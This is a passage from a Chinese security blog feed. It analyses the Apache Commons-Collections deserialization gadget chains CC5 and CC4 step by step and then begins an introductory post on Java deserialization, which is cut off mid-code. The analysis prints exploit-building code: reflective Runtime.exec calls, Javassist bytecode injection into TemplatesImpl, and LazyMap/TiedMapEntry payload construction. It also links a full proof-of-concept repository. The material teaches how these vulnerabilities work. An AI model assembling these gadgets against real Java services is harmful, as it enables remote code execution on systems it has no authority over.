target="_blank" rel="noopener">Skipped breakpoint because it happened inside debugger evaluation</a> ，否则你可能出现很多bug。<br><img src="https://img-blog.csdnimg.cn/20200517155502933.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517151930246.png" alt="在这里插入图片描述"></p><hr><h4 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h4><ol><li>一直跟进，到<code>BadAttributeValueException.java</code>的<code>readObject</code>方法。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200517163343981.png" alt="在这里插入图片描述"><br>2. toString方法会跳转到<code>TiedMapEntry</code>的toString方法<br><img src="https://img-blog.csdnimg.cn/20200517163803421.png" alt="在这里插入图片描述"><br>3. 跟进getValue()方法<br><img src="https://img-blog.csdnimg.cn/20200517165203612.png" alt="在这里插入图片描述"><br>4. 跟进到get()方法，在get方法中，会判断<code>key</code>是否存在。然后跳转到<code>transform(key)</code>，这里的key是随便填写的，主要是transform方法是被修改过的，里面有恶意payload。<br><img src="https://img-blog.csdnimg.cn/20200517165322855.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200517165354634.png" alt="在这里插入图片描述"><br>5. 这里是用Java的反射机制，建议去了解一下。推荐博文<a href="https://blog.csdn.net/sun1318578251/category_9977685.html" target="_blank" rel="noopener">从安全角度谈Java反射机制</a><br><img src="https://img-blog.csdnimg.cn/20200517173626405.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517164317458.png" alt="在这里插入图片描述"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLXN0YXRpYy5jbmJsb2dzLmNvbS9maWxlcy9zYW1ueS9zZXJpYWxpemFibGUzLmdpZg" alt="https://blog-static.cnblogs.com/files/samny/serializable3.gif"><br>&emsp;&emsp; 看完整个完整的过程，每一步都对应着文章开头的Gadget chain。创建异常类<code>BadAttributeValueExpException</code>，以便于在反序列化时触发payload。<br><img src="https://img-blog.csdnimg.cn/2020051814514391.png" alt="在这里插入图片描述"></p><hr><h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>&emsp;&emsp; 过程看完了，但是我们还是无法理解为什么可以这么构造，还是得一步步看POC源码。我们一一对着官方文档分析函数方法的具体作用。</p><ol><li>ChainedTransformer将一个个Transformer类数组按照顺序一个个执行，前一个运行结果作为第二个transform。<br><img src="https://img-blog.csdnimg.cn/20200517173011310.png" alt="在这里插入图片描述"></li><li>ConstantTransformer调用transform方法，返回类在实例化时存储的类。<br><img src="https://img-blog.csdnimg.cn/20200517173510549.png" alt="在这里插入图片描述"></li><li>InvokerTransformer调用transform方法的时候，根据类在实例化时提供的参数，通过反射去调用对象的方法。InvokerTransformer第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(java.lang.String methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Object[] args)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517175953505.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这是一段反射执行命令的代码，这段执行的效果完全等效于transformers[]数组，下面两张图片可以完美的诠释。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">//实例化对象</span></span><br><span class="line">          Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 反射调用执行命令</span></span><br><span class="line">           cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517164708950.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200517175632226.png" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 创建一个HashMap，使用LazyMap.decorate()方法传入HashMap和Transformer数组。其中数组是我们构造的payload，最后使用TiedMapEntry传入一个key。其实也可以这样子<code>lazymap.get(&quot;Summer&quot;)</code>也可以传入key，这样子会在序列化过程就将key写入，而在反序列化的时候不会调用<code>LazyMap.get()</code>方法，判断key是否存在。不存在则会调用<code>this.factory.transform(key);</code>方法，进而触发反序列化漏洞。所以很显然这种方法不可取，只能通过修改底层的方式，加入key值，以便于在反序列化的时候触发漏洞，并同时确保在序列化的过程不会触发漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">      Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200518095025914.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 到目前为止，并没有触发反序列化漏洞的入口。而<code>BadAttributeValueExpException</code>这个类是javax.management报下的一个类，是jdk自带的，无需依赖第三方。它继承了Serializable接口满足反序列化漏洞的条件，它只有一个值权限是private不可修改，但利用反射机制修改其值来到达触发反序列化漏洞的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(expException, entry);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 反序列化利用点是使用<code>LazyMap</code>在获取key值的时候，使其key不存在，然后再获取key的时候触发漏洞。但需要有一个入口，这里的反序列化触发的入口是JDK自带的<code>BadAttributeValueExpException</code>类。有几个点不得不服大佬们的厉害之处，第一点是找到反序列化的入口<code>BadAttributeValueExpException</code>，这个类得满足反序列化的基本条件，还得是JDK自带或者是组件自带的。第二点是使用<code>LazyMap</code>的key为空来触发反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518105354743.png" alt="在这里插入图片描述"></p><hr><h1 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons-Collections4"></a>Commons-Collections4</h1><p> 先看一下Gadget链，入口是JDK自带的<code>PriorityQueue.readObject()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 断点撸码，断点的位置对于新手可能有点不知道该从何下手，其实掌握一点，看入口，反序列化的入口。<code>Commons-Collections4</code>这里的入口时<code>PriorityQueue.readObject()</code>方法，这时你可以双击<code>Shift</code>，找到该类在readObject下断点。<br><img src="https://img-blog.csdnimg.cn/20200518164944907.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 去掉注释，也就省这么几行代码。自己结合官方文档分析一下就知道该断在哪里，如果你在知道具体步骤，你可以将每一行都设置个断点进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        s.readInt();</span><br><span class="line">        queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发流程-1"><a href="#漏洞触发流程-1" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol><li>从ObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;heapify()方法<br><img src="https://img-blog.csdnimg.cn/2020051816535565.png" alt="在这里插入图片描述"></li><li>接着会执行heapify()-&gt;sifrDown()<br><img src="https://img-blog.csdnimg.cn/20200518165629497.png" alt="在这里插入图片描述"></li><li>sifrDown()-&gt;comparator不为空进入siftDownUsingComparator()方法<br><img src="https://img-blog.csdnimg.cn/2020051816581125.png" alt="在这里插入图片描述"></li><li>if判断是否&lt;=0是触发漏洞<br><img src="https://img-blog.csdnimg.cn/20200518165904692.png" alt="在这里插入图片描述"></li><li>compare方法会执行transformer的transform方法，而transform通过反射机制被修改过，最后会导致反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518170453617.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt="在这里插入图片描述"></li></ol><hr><h3 id="漏洞成因分析-1"><a href="#漏洞成因分析-1" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java" target="_blank" rel="noopener">完整的实验代码地址https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java</a><br>&emsp;&emsp; Javaassist被广泛用于修改字节码的工具包，而此gadget chain中使用修改字节码的形式触发漏洞。一个 CtClass (编译时类）对象可以处理一个 class 文件，ClassPool 是 CtClass 对象的容器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认系统类搜索路径</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Payload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">      <span class="comment">// 获取我们恶意payload的对象</span></span><br><span class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(Payload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 修改好字节码后，在通过一系列的反射方法，将构造好的字节加入<code>tamplates</code>中，在反序列化的过程触发漏洞。反射这里就不过多的解释，如果不懂可以看笔者往期的博文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 静态初始化时插入执行命令的字节码</span></span><br><span class="line">      String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">      clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// 将初始化后的类设置新的名字</span></span><br><span class="line">      clazz.setName(<span class="string">"Summer"</span> + System.nanoTime());</span><br><span class="line">      <span class="comment">// 设置父类为AbstractTranslet</span></span><br><span class="line">      CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">      clazz.setSuperclass(superC);</span><br><span class="line"><span class="comment">// 获取修改后的字节码</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 其实将第二个占位只要是Object的类型对象就可以，比例可以是<code>tpl.newInstace()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里queue要占两个位，比较方法是要两个才能比较</span></span><br><span class="line">      <span class="comment">// 两个位的都要是一个类型，这里都是Object</span></span><br><span class="line">      queue.add(templates);</span><br><span class="line">      queue.add(<span class="keyword">new</span> VerifyError(<span class="string">"Summer"</span>));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;修改字节码之后我们再看看<code>newTransformer()</code>–&gt;<code>TemplatesImpl.getTransletInstance()</code> 方法。<br><img src="https://img-blog.csdnimg.cn/20200520141806664.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <code>getTransletInstance()</code>–&gt;<code>defineTransletClasses()</code>，这里会返回一个定义主类的类对象的引用。<br><img src="https://img-blog.csdnimg.cn/20200520142312443.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 最后在这里的强制类型转化触发漏洞，到达执行命令的效果。<br><img src="https://img-blog.csdnimg.cn/20200520142424728.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200520142558464.gif" alt="在这里插入图片描述"></p><hr><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; <code>PriorityQueue</code>原本只是个优先队列，<code>TemplatesImpl</code>原本只是在xalan中的处理xml的模板实现，但是经过大佬之手二者结合产生巨大效果。吾不敢不服，下面只想用一图展现笔者对此gadget的思考。<br><img src="https://img-blog.csdnimg.cn/20200520144825335.png" alt="在这里插入图片描述"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 看完其实不难发现，Java反序列化漏洞必然离不开Java的反射机制的作用。这种都是底层的Java语言的开发者所想到便于开发的机制，下图是oracle官方给出的图例，笔者觉得如果想要打开一个新方向必然会用到一种“新”机制，这种机制应该还是开发人员经常使用的。<br><img src="https://img-blog.csdnimg.cn/20200520151819350.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 一个新的Gadget的产生构造笔者有几点愚见，如有错误还望海涵。</p><ol><li>一个JDK自带的实现<code>Serializabe</code>接口</li><li>必然离不开Java反射机制</li><li>readObject()方法</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tool.oschina.net/apidocs/apidoc?api=commons-collections" target="_blank" rel="noopener">https://tool.oschina.net/apidocs/apidoc?api=commons-collections</a><br><a href="https://paper.seebug.org/1195/" target="_blank" rel="noopener">https://paper.seebug.org/1195/</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://xz.aliyun.com/t/7031#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-5</a><br><a href="https://blog.csdn.net/chenwan8737/article/details/100716015" target="_blank" rel="noopener">https://blog.csdn.net/chenwan8737/article/details/100716015</a><br><a href="https://blog.csdn.net/weixin_33802505/article/details/92214760" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33802505/article/details/92214760</a><br><a href="https://blog.csdn.net/21aspnet/article/details/81671777" target="_blank" rel="noopener">https://blog.csdn.net/21aspnet/article/details/81671777</a><br><a href="https://xalan.apache.org/xalan-j/apidocs/index.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/index.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;﻿# 前言&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过&lt;code&gt;ysoserial--Gadget--URLDNS&lt;/code&gt;，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者
      
    
    </summary>
    
    
    
      <category term="Java Commons-Collections" scheme="https://summersec.github.io/tags/Java-Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>漫谈Java反序列化</title>
    <link href="https://summersec.github.io/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://summersec.github.io/2020/05/20/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-20T04:42:16.000Z</published>
    <updated>2020-05-20T08:11:22.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; Java的反序列化漏洞探索出了Java安全的新纪元。开发人员为什么要反序列化呢？众所周知，用户和服务器进行交互时，会传输一下数据，数据传输前需要格式化，将数据转化成服务器认可的格式。比例：<code>JSON</code>、<code>XML</code>。<br>&emsp;&emsp; <code>JSON</code>和<code>XML</code>的优点是兼容性比较强，是通用的数据交互格式。缺点是不支持复杂的数据类型。故开发人员面对需要复杂的数据类型是将数据反序列化，以来达数据交互的目的。<br>&emsp;&emsp;  Java程序在运行时，会产生大量的数据。有些时候，我们需要将内存中的对象信息存储到磁盘或者通过网络发送给第三者，此时，就需要对对象进行序列化操作。当我们需要从磁盘或网络读取存储的信息时，即为反序列化。简单理解，序列化即将内存中的对象信息转换为字节流并存储在磁盘或通过网络发送。反序列化，即从磁盘或网络读取信息，直接转换为内存对象。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p><strong>反序列化漏洞基本条件</strong></p><ol><li>Java反序列化类一定要实现<code>Serializabe</code>接口</li><li>所有的Java反序列化漏洞都是用通过<code>readObject()</code>实现</li><li>所有反序列化数据都是要通过<code>writeObject()</code>函数实现<br><img src="https://img-blog.csdnimg.cn/20200517185517421.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>SerialVersionUID</strong><br>&emsp;&emsp; Java的序列化的机制通过判断serialVersionUID来验证版本的一致性。在反序列化的时候与本地的类的serialVersionUID进行比较，一致则可以进行反序列化，不一致则会抛出异常InvalidCastException。IDEA是可以自动生成一个serialVersionUID，需要设置如下。<br><img src="https://img-blog.csdnimg.cn/20200514152044147.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200514153405922.png" alt="在这里插入图片描述"></p><hr><h2 id="案例DEMO"><a href="#案例DEMO" class="headerlink" title="案例DEMO"></a>案例DEMO</h2><p><code>javaSerializableDemo1</code>源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaSerializableDemo1</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="comment">// 序列版本ID</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">1877568378649280904L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Integer IdCard;</span><br><span class="line">    <span class="keyword">private</span> Date time;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">javaSerializableDemo1</span><span class="params">(String username, String password, Integer age, Integer idCard, Date time)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        IdCard = idCard;</span><br><span class="line">        <span class="keyword">this</span>.time = time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 省略一部分set、get方法。</span></span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"javaSerializableDemo&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">", IdCard="</span> + IdCard +</span><br><span class="line">                <span class="string">", time="</span> + time +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javaUnSerizableDemo1</code>源码，一般情况下<code>对象写入流writerObject()</code>和<code>对象的输出流readObject</code>是分开实现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaUnSerializableDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        javaSerializableDemo1 demo = <span class="keyword">new</span> javaSerializableDemo1(<span class="string">"Summer"</span>,<span class="string">"6666888"</span>,<span class="number">18</span>,<span class="number">666666</span>,<span class="keyword">new</span> Date());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"serializable: "</span> + demo);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象写入文件中</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            oos.writeObject(demo);</span><br><span class="line"></span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读文件</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            javaSerializableDemo1 newdemo = (javaSerializableDemo1) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + newdemo);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051416583311.png" alt="在这里插入图片描述"><br>由于是字节码，直接打开是乱码。<br><img src="https://img-blog.csdnimg.cn/20200514165909506.png" alt="在这里插入图片描述"><br>用vscode插件<code>hexdump</code>查看生成的文件。<br><img src="https://img-blog.csdnimg.cn/20200514170059910.png" alt="在这里插入图片描述"><br>或者使用<code>SerializationDumper.jar</code>工具，效果如下部分截图。<br>下载地址：<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">https://github.com/NickstaDB/SerializationDumper</a><br><img src="https://img-blog.csdnimg.cn/2020051417045964.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 这个DEMO中实现了笔者前文所提及到的三要素，但似乎你还看不出来漏洞的存在的地方。</p><hr><h2 id="漏洞DEMO"><a href="#漏洞DEMO" class="headerlink" title="漏洞DEMO"></a>漏洞DEMO</h2><p>&emsp;&emsp; 下面会以一个存在的漏洞demo，带你更进一步理解Java反序列化的危害。<br><strong>漏洞源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerabilityClass</span> <span class="keyword">implements</span> <span class="title">summer</span>.<span class="title">serializable</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5550839108669505813L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span 